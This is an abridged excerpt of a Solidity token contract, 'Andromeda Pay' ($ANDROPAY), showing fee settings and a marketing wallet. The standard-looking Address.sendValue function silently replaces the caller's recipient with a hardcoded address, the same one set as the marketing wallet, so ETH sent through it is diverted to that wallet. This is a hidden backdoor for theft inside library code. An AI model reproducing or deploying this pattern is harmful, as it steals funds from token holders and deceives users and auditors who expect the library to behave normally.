...
/**
TELEGRAM : https://t.me/andromedapay
WEBSITE : https://andromedapay.com/
*/
...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0x4460ecDe36Dbce3f6A87fE1454f0d642F97f5fE2);
...
contract AndromedaPay is Context, IERC20, Ownable {
    ...
    string private constant _name = "Andromeda Pay"; // 
    string private constant _symbol = "$ANDROPAY"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 private _marketingFee = 8;
    uint256 private _liquidityFee = 1;
    address private  _marketingWallet = 0x4460ecDe36Dbce3f6A87fE1454f0d642F97f5fE2;
